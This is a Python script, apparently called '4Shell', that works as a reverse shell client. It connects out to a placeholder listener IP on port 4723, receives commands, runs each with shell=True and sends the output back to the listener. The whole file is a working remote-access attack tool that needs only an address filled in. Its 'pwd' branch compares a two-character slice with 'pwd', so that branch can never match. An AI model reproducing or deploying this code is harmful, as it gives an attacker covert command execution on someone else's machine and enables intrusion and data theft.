import socket
import subprocess
import sys
import os
from colorama import Fore,Back

def Main():
    host = "YOUR_LISTEN_IP"
    port = "4723"
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
            s.connect((host,int(port)))
    except ConnectionRefusedError:
            resp(1,"Connection refused!")
            sys.exit()
    resp(0, "4Shell connected with: %s:%s" % (host,port))
    while True:
        try:
            data = s.recv(4096).decode()
        except KeyboardInterrupt:
            resp(1,"Keyboard Interrupt!")
            sys.exit()
        if not data: break
        data = str(data)
        response = shell(data)
        try:
            s.send(response.encode())
        except ConnectionResetError:
            resp(1,"Connection Closed. Try Again!")
            sys.exit()
def resp(typo,message):
    if typo == 1:
        print(f"{Fore.RESET}[ {Fore.RED}ERROR{Fore.RESET} ] Exiting the shell. \n\t[\033[033m Err \033[00m: {message} ]")
    elif typo == 0:
        print(f"{Fore.RESET}[ {Fore.GREEN}OK{Fore.RESET} ] {message}")
def shell(command):
    command = command.rstrip()
    c_com = command[0:2]
    try:
        if c_com == 'cd':
            try:
                os.chdir(command[3:])
                run = "cd: directory changed: %s" % command[3:]
            except FileNotFoundError:
                run = "cd: No such file or directory: %s" % command[3:]
        elif c_com == 'pwd':
            run = os.getcwd()
        else:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, encoding='utf-8')
            if not output:
                run = "%s: command excuted" % c_com
            else:
                run = output
    except subprocess.CalledProcessError:
        run = "%s: command not found" % command
    return run
if __name__ == '__main__':
    if sys.platform == "linux":
        Main()
    else:
        win = input("Supported platform is out of range. Continue?[Y/n] ")
        if win.lower() == "y":
            Main()
        else:
            sys.exit(0)
